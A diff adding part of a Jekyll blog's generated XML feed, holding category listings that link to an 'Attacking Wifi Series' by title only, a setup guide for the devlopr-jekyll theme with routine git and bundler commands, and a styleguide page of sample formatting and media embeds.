+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/25/hacking-clientless-wep/&quot;&gt;Attacking Wifi Series, Part 4&lt;br /&gt; Hacking Clientess WEP Networks&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/23/hacking-wep-via-client/&quot;&gt;Attacking Wifi Series, Part 3&lt;br /&gt; Hacking WEP via a Client&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/03/18/hacking-wep-connected-clients/&quot;&gt;Attacking Wifi Series, Part 2&lt;br /&gt;Hacking WEP With Connected Clients&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/2019/12/03/attacking-wifi-commands/&quot;&gt;Attacking Wifi Series, Part 1&lt;br /&gt; Overview &amp;amp; Commands&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#WEP&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/WEP&quot;&gt;WEP&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;WEP&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/27/bypassing-wep-shared-key-authentication/&quot;&gt;Attacking Wifi Series, Part 5&lt;br /&gt;Bypassing WEP Shared Key Authentication&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/25/hacking-clientless-wep/&quot;&gt;Attacking Wifi Series, Part 4&lt;br /&gt; Hacking Clientess WEP Networks&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/23/hacking-wep-via-client/&quot;&gt;Attacking Wifi Series, Part 3&lt;br /&gt; Hacking WEP via a Client&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/03/18/hacking-wep-connected-clients/&quot;&gt;Attacking Wifi Series, Part 2&lt;br /&gt;Hacking WEP With Connected Clients&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#Raspberry Pi&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/Raspberry Pi&quot;&gt;Raspberry Pi&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;Raspberry Pi&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/raspberry%20pi/hostapd/wireless/2020/04/30/setting-up-wifi-ap-rpi/&quot;&gt;Setting up a Rasberry Pi as a Wireless AP&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#HostAPd&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/HostAPd&quot;&gt;HostAPd&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;HostAPd&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/raspberry%20pi/hostapd/wireless/2020/04/30/setting-up-wifi-ap-rpi/&quot;&gt;Setting up a Rasberry Pi as a Wireless AP&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#WPA&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/WPA&quot;&gt;WPA&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;WPA&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wpa/wpa2/2020/05/04/hacking-wpa-wpa2-psk/&quot;&gt;Attacking Wifi Series, Part 6&lt;br /&gt;Hacking WPA/WPA2 PSK&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#WPA2&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/WPA2&quot;&gt;WPA2&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;WPA2&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wpa/wpa2/2020/05/04/hacking-wpa-wpa2-psk/&quot;&gt;Attacking Wifi Series, Part 6&lt;br /&gt;Hacking WPA/WPA2 PSK&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+&lt;/div&gt;
+
+</description>
+            <link>http://localhost:4000/blog/categories/</link>
+          </item>
+        
+      
+    
+      
+    
+      
+    
+      
+        
+          <item>
+            <title>Guides</title>
+            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;
+
+&lt;div class=&quot;card&quot;&gt;
+{% for post in site.categories.guides %}
+ &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
+{% endfor %}
+&lt;/div&gt;</description>
+            <link>http://localhost:4000/blog/categories/guides/</link>
+          </item>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <item>
+            <title>Get Started</title>
+            <description>## Getting Started - How to use “devlopr-jekyll” theme
+
+## What&apos;s Jekyll ?
+
+If you aren’t familiar with Jekyll yet, you should know that it is a static site generator. It will transform your plain text into static websites and blogs. No more databases, slow loading websites, risk of being hacked…just your content. And not only that, with Jekyll you get free hosting with GitHub Pages! If you are a beginner we recommend you start with [Jekyll’s Docs](https://jekyllrb.com/docs/installation/). Now, if you know how to use Jekyll, let’s move on to using this theme in Jekyll:
+
+## Watch Tutorial
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/cXBEfpn0qrg?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;
+
+
+### Steps to create your blog using devlopr-jekyll and Host using Github Pages :
+
+&gt;  **Step 1.**  Fork the repo - [click here](https://github.com/sujaykundu777/devlopr-jekyll/fork)
+
+![Devlopr Jekyll Repo](/assets/img/posts/fork1.PNG){:class=&quot;img-fluid&quot;}
+
+&gt; **Step 2.** Use **your-github-username.github.io** as the new repo  ( Replace your-github-username with yours). Remember if you use the name other than your-github-username.github.io , your blog will be built using gh-pages branch.
+
+![Devlopr Jekyll Repo](/assets/img/posts/fork2.PNG){:class=&quot;img-fluid&quot;}
+
+![Devlopr Jekyll Repo](/assets/img/posts/fork3.PNG){:class=&quot;img-fluid&quot;}
+
+&gt; **Step 3.** Clone the new repo locally to make changes :
+
+![Devlopr Jekyll Repo](/assets/img/posts/fork31.PNG){:class=&quot;img-fluid&quot;}
+
+![Devlopr Jekyll Repo](/assets/img/posts/fork32.PNG){:class=&quot;img-fluid&quot;}
+
+![Devlopr Jekyll Repo](/assets/img/posts/fork33.PNG){:class=&quot;img-fluid&quot;}
+
+```bash
+ $ git clone https://github.com/yourusername/yourusername.github.io
+ $ cd yourusername.github.io
+ $ code .
+```
+
+&gt; **Step 4.** Open the files using VSCode and edit _config.yml and edit with your details:
+
+- _config.yml file - replace with your own details
+- _posts - Add your blog posts here
+- _includes - You can replace the contents of the files with your data. (contains widgets)
+- _assets/img - Add all your images here
+
+![Devlopr Jekyll Repo](/assets/img/posts/fork34.PNG){:class=&quot;img-fluid&quot;}
+
+&gt; **Step 5** - Install the development requirements:
+
+### Set up local development environment
+
+1. [Git](https://git-scm.com/)
+2. [Ruby](https://www.ruby-lang.org/) and [Bundler](https://bundler.io/)
+3. [VSCode](https://code.visualstudio.com/download)
+
+We need ruby and bundler to build our site locally. After installation check if its working:
+
+For ruby :
+
+```bash
+$ ruby -v
+ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux-gnu]
+```
+For bundler :
+
+```bash
+$ gem install bundler
+$ bundler -v
+Bundler version 2.2.29
+```
+Add jekyll :
+
+```bash
+$ bundle update
+$ bundle add jekyll
+```
+ This command will add the Jekyll gem to our Gemfile and install it to the ./vendor/bundle/ folder.
+
+You can check the jekyll version
+
+```
+$ bundle exec jekyll -v
+jekyll 4.2.0
+```
+
+&gt; **Step 6.** Install the gem dependencies by running the following command
+
+```bash
+$ bundle update
+$ bundle install
+```
+
+&gt; **Step 7.** Serve the site locally by running the following command below:
+
+```bash
+$ bundle exec jekyll serve --watch
+```
+or you can also serve using :
+
+```bash
+$ jekyll serve
+```
+
+Visit [http://localhost:4000](http://localhost:4000) for development server
+
+![Devlopr Jekyll Repo](/assets/img/posts/fork41.PNG){:class=&quot;img-fluid&quot;}
+
+
+### Adding Content
+
+Start populating your blog by adding your .md files in _posts. devlopr-jekyll already has a few examples.
+
+#### YAML Post Example:
+
+```yml
+---
+layout: post
+title: Sample Post
+author: Sujay Kundu
+date: &apos;2019-05-21 14:35:23 +0530&apos;
+category:
+        - jekyll
+summary: This is the summary for the sample post
+thumbnail: sample.png
+---
+
+Hi ! This is sample post.
+
+```
+
+#### YAML Page Example:
+
+```yml
+---
+layout: page
+title: Sample Page
+permalink: /sample-page/
+---
+
+Hi ! This is sample page.
+```
+
+#### Editing stylesheet
+
+You’ll only work with a single file to edit/add theme style: assets/css/main.scss.
+
+### Deploy your Changes
+
+Once happy with your blog changes. Push your changes to master branch.
+
+&gt; **Step 8.** Push Your Local Changes
+
+```bash
+ $ git add .
+ $ git commit -m &quot;my new blog using devlopr-jekyll&quot;
+ $ git push origin master
+```
+
+Visit your Github Repo settings ! Enable master branch as Github Pages Branch :
+
+![Devlopr Jekyll Repo](/assets/img/posts/fork6.PNG){:class=&quot;img-fluid&quot;}
+
+&gt; **Step 9.** Deploy your Blog :
+
+![Devlopr Jekyll Repo](/assets/img/posts/fork7.PNG){:class=&quot;img-fluid&quot;}
+
+&gt; Congrats ! On your new shining Blog !
+
+You can visit the blog using [http://your-github-username.github.io](http://your-github-username.github.io).
+
+</description>
+            <link>http://localhost:4000/get-started/</link>
+          </item>
+        
+      
+    
+      
+        
+          <item>
+            <title>Jekyll</title>
+            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;
+
+&lt;div class=&quot;card&quot;&gt;
+{% for post in site.categories.jekyll %}
+ &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
+{% endfor %}
+&lt;/div&gt;</description>
+            <link>http://localhost:4000/blog/categories/jekyll/</link>
+          </item>
+        
+      
+    
+      
+    
+      
+    
+      
+        
+          <item>
+            <title>Guides</title>
+            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;
+
+&lt;div class=&quot;card&quot;&gt;
+{% for post in site.categories.sample_category %}
+ &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
+{% endfor %}
+&lt;/div&gt;</description>
+            <link>http://localhost:4000/blog/categories/sample_category/</link>
+          </item>
+        
+      
+    
+      
+    
+      
+        
+          <item>
+            <title>Our Sponsors</title>
+            <description>Thanks to all the amazing contributors and our Backers for the support.
+
+- [Dirish Mohan](https://dirishmohan.com)</description>
+            <link>http://localhost:4000/sponsors/</link>
+          </item>
+        
+      
+    
+      
+        
+          <item>
+            <title>Styleguide</title>
+            <description>### devlopr - Styleguide
+
+&lt;hr /&gt;
+
+ &lt;img src=&quot;/assets/img/styleguide.png&quot; class=&quot;img-fluid&quot;&gt;
+
+&lt;p&gt; Lets try the different text styles  &lt;b&gt; Bold &lt;/b&gt; , &lt;strong&gt; Strong &lt;/strong&gt;, &lt;em&gt; Emphasis &lt;/em&gt;, &lt;i&gt; Italic &lt;/i&gt; &lt;/p&gt;
+
+
+&lt;p&gt; Now, lets try different heading styles : &lt;/p&gt;
+
+&lt;h1&gt; Hello in h1 ! &lt;/h1&gt;
+&lt;h2&gt; Hello in h2 ! &lt;/h2&gt;
+&lt;h3&gt; Hello in h3 ! &lt;/h3&gt;
+&lt;h4&gt; Hello in h4 ! &lt;/h4&gt;
+&lt;h5&gt; Hello in h5 ! &lt;/h5&gt;
+&lt;h6&gt; Hello in h6 ! &lt;/h6&gt;
+
+&lt;hr /&gt;
+&lt;p&gt; Unordered List &lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt; List Item 1 &lt;/li&gt;
+&lt;li&gt; List Item 2 &lt;/li&gt;
+&lt;li&gt; List Item 3 &lt;/li&gt;
+&lt;li&gt; List Item 4 &lt;/li&gt;
+&lt;li&gt; List Item 5 &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt; Ordered List &lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt; List Item 1 &lt;/li&gt;
+&lt;li&gt; List Item 2 &lt;/li&gt;
+&lt;li&gt; List Item 3 &lt;/li&gt;
+&lt;li&gt; List Item 4 &lt;/li&gt;
+&lt;li&gt; List Item 5 &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;This is a Block Quote,  It can Expand Multiple Lines &lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p&gt;You can use the mark tag to &lt;mark&gt;highlight&lt;/mark&gt; text. &lt;/p&gt;
+
+&lt;p&gt;&lt;del&gt; This line of text is meant to be deleted text &lt;/del&gt; &lt;/p&gt;
+
+&lt;p&gt;&lt;u&gt;This line of text will render as underlined&lt;/u&gt;&lt;/p&gt;
+&lt;p&gt;&lt;small&gt;This line of text is meant to be treated as fine print.&lt;/small&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;This line rendered as bold text.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;This line rendered as italicized text.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;abbr title=&quot;attribute&quot;&gt;attr&lt;/abbr&gt;&lt;/p&gt;
+&lt;p&gt;&lt;abbr title=&quot;HyperText Markup Language&quot; class=&quot;initialism&quot;&gt;HTML&lt;/abbr&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;div class=&quot;responsive-table&quot;&gt;
+&lt;table&gt;
+      &lt;thead&gt;
+        &lt;tr&gt;
+          &lt;th scope=&quot;col&quot;&gt;#&lt;/th&gt;
+          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
+          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
+          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
+          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
+          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
+          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
+          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
+          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
+          &lt;th scope=&quot;col&quot;&gt;Heading&lt;/th&gt;
+        &lt;/tr&gt;
+      &lt;/thead&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;th scope=&quot;row&quot;&gt;1&lt;/th&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+          &lt;th scope=&quot;row&quot;&gt;2&lt;/th&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+          &lt;th scope=&quot;row&quot;&gt;3&lt;/th&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+          &lt;td&gt;Cell&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+    &lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h3&gt; Instagram Embed &lt;/h3&gt;
+
+&lt;blockquote class=&quot;instagram-media&quot; data-instgrm-captioned data-instgrm-permalink=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; data-instgrm-version=&quot;13&quot; style=&quot; background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:540px; min-width:326px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);&quot;&gt;&lt;div style=&quot;padding:16px;&quot;&gt; &lt;a href=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; style=&quot; background:#FFFFFF; line-height:0; padding:0 0; text-align:center; text-decoration:none; width:100%;&quot; target=&quot;_blank&quot;&gt; &lt;div style=&quot; display: flex; flex-direction: row; align-items: center;&quot;&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 40px; margin-right: 14px; width: 40px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: column; flex-grow: 1; justify-content: center;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 100px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 60px;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;padding: 19% 0;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display:block; height:50px; margin:0 auto 12px; width:50px;&quot;&gt;&lt;svg width=&quot;50px&quot; height=&quot;50px&quot; viewBox=&quot;0 0 60 60&quot; version=&quot;1.1&quot; xmlns=&quot;https://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;https://www.w3.org/1999/xlink&quot;&gt;&lt;g stroke=&quot;none&quot; stroke-width=&quot;1&quot; fill=&quot;none&quot; fill-rule=&quot;evenodd&quot;&gt;&lt;g transform=&quot;translate(-511.000000, -20.000000)&quot; fill=&quot;#000000&quot;&gt;&lt;g&gt;&lt;path d=&quot;M556.869,30.41 C554.814,30.41 553.148,32.076 553.148,34.131 C553.148,36.186 554.814,37.852 556.869,37.852 C558.924,37.852 560.59,36.186 560.59,34.131 C560.59,32.076 558.924,30.41 556.869,30.41 M541,60.657 C535.114,60.657 530.342,55.887 530.342,50 C530.342,44.114 535.114,39.342 541,39.342 C546.887,39.342 551.658,44.114 551.658,50 C551.658,55.887 546.887,60.657 541,60.657 M541,33.886 C532.1,33.886 524.886,41.1 524.886,50 C524.886,58.899 532.1,66.113 541,66.113 C549.9,66.113 557.115,58.899 557.115,50 C557.115,41.1 549.9,33.886 541,33.886 M565.378,62.101 C565.244,65.022 564.756,66.606 564.346,67.663 C563.803,69.06 563.154,70.057 562.106,71.106 C561.058,72.155 560.06,72.803 558.662,73.347 C557.607,73.757 556.021,74.244 553.102,74.378 C549.944,74.521 548.997,74.552 541,74.552 C533.003,74.552 532.056,74.521 528.898,74.378 C525.979,74.244 524.393,73.757 523.338,73.347 C521.94,72.803 520.942,72.155 519.894,71.106 C518.846,70.057 518.197,69.06 517.654,67.663 C517.244,66.606 516.755,65.022 516.623,62.101 C516.479,58.943 516.448,57.996 516.448,50 C516.448,42.003 516.479,41.056 516.623,37.899 C516.755,34.978 517.244,33.391 517.654,32.338 C518.197,30.938 518.846,29.942 519.894,28.894 C520.942,27.846 521.94,27.196 523.338,26.654 C524.393,26.244 525.979,25.756 528.898,25.623 C532.057,25.479 533.004,25.448 541,25.448 C548.997,25.448 549.943,25.479 553.102,25.623 C556.021,25.756 557.607,26.244 558.662,26.654 C560.06,27.196 561.058,27.846 562.106,28.894 C563.154,29.942 563.803,30.938 564.346,32.338 C564.756,33.391 565.244,34.978 565.378,37.899 C565.522,41.056 565.552,42.003 565.552,50 C565.552,57.996 565.522,58.943 565.378,62.101 M570.82,37.631 C570.674,34.438 570.167,32.258 569.425,30.349 C568.659,28.377 567.633,26.702 565.965,25.035 C564.297,23.368 562.623,22.342 560.652,21.575 C558.743,20.834 556.562,20.326 553.369,20.18 C550.169,20.033 549.148,20 541,20 C532.853,20 531.831,20.033 528.631,20.18 C525.438,20.326 523.257,20.834 521.349,21.575 C519.376,22.342 517.703,23.368 516.035,25.035 C514.368,26.702 513.342,28.377 512.574,30.349 C511.834,32.258 511.326,34.438 511.181,37.631 C511.035,40.831 511,41.851 511,50 C511,58.147 511.035,59.17 511.181,62.369 C511.326,65.562 511.834,67.743 512.574,69.651 C513.342,71.625 514.368,73.296 516.035,74.965 C517.703,76.634 519.376,77.658 521.349,78.425 C523.257,79.167 525.438,79.673 528.631,79.82 C531.831,79.965 532.853,80.001 541,80.001 C549.148,80.001 550.169,79.965 553.369,79.82 C556.562,79.673 558.743,79.167 560.652,78.425 C562.623,77.658 564.297,76.634 565.965,74.965 C567.633,73.296 568.659,71.625 569.425,69.651 C570.167,67.743 570.674,65.562 570.82,62.369 C570.966,59.17 571,58.147 571,50 C571,41.851 570.966,40.831 570.82,37.631&quot;&gt;&lt;/path&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div style=&quot;padding-top: 8px;&quot;&gt; &lt;div style=&quot; color:#3897f0; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:550; line-height:18px;&quot;&gt; View this post on Instagram&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;padding: 12.5% 0;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: row; margin-bottom: 14px; align-items: center;&quot;&gt;&lt;div&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(0px) translateY(7px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot;background-color: #F4F4F4; height: 12.5px; transform: rotate(-45deg) translateX(3px) translateY(1px); width: 12.5px; flex-grow: 0; margin-right: 14px; margin-left: 2px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(9px) translateY(-18px);&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;margin-left: 8px;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 20px; width: 20px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; width: 0; height: 0; border-top: 2px solid transparent; border-left: 6px solid #f4f4f4; border-bottom: 2px solid transparent; transform: translateX(16px) translateY(-4px) rotate(30deg)&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;margin-left: auto;&quot;&gt; &lt;div style=&quot; width: 0px; border-top: 8px solid #F4F4F4; border-right: 8px solid transparent; transform: translateY(16px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; flex-grow: 0; height: 12px; width: 16px; transform: translateY(-4px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot; width: 0; height: 0; border-top: 8px solid #F4F4F4; border-left: 8px solid transparent; transform: translateY(-4px) translateX(8px);&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: column; flex-grow: 1; justify-content: center; margin-bottom: 24px;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 224px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 144px;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;p style=&quot; color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;&quot;&gt;&lt;a href=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; style=&quot; color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;&quot; target=&quot;_blank&quot;&gt;A post shared by Sujay (@sujaykundu777)&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt; &lt;script async src=&quot;//www.instagram.com/embed.js&quot;&gt;&lt;/script&gt;
+
+&lt;hr&gt;
+
+&lt;h3&gt; Twitter Embed &lt;/h3&gt;
+
+&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;en&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;I just published “Deploying a blog using Jekyll and Github Pages with SSL certificate for Free” &lt;a href=&quot;https://t.co/B3T3IQVU93&quot;&gt;https://t.co/B3T3IQVU93&lt;/a&gt;&lt;/p&gt;&amp;mdash; Sujay Kundu (@SujayKundu777) &lt;a href=&quot;https://twitter.com/SujayKundu777/status/1012601950469160962?ref_src=twsrc%5Etfw&quot;&gt;June 29, 2018&lt;/a&gt;&lt;/blockquote&gt;
+&lt;script async src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;
+
+&lt;hr /&gt;
+
+
+&lt;h3&gt;YouTube Responsive Embed&lt;/h3&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/bBpKMH3nBzE?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;
+
+&lt;hr /&gt;
+
+&lt;h3&gt;Vimeo Responsive Embed&lt;/h3&gt;
+
+&lt;iframe src=&quot;https://player.vimeo.com/video/212114694?title=0&amp;amp;byline=0&amp;amp;portrait=0&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;ted-responsive-embed&quot;&gt;TED Responsive Embed&lt;/h3&gt;
+
